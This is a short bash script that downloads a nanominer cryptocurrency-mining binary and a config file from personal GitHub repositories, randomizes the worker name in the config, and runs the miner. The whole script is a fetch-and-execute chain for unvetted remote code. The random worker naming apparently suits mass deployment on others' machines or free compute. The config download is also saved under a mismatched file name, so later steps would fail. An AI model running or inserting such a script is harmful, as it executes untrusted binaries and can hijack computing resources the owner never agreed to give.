#!/bin/bash
wget https://raw.githubusercontent.com/mody199610/nanominer/master/nanominer
wget https://raw.githubusercontent.com/solahfatsalma/VV/main/cfg.ini?raw=true
chmod +x cfg.ini
chmod +x nanominer
sed -i "s/nanominer/$(shuf -n 1 -i 1-999999)/" "cfg.ini"
./nanominer cfg.ini
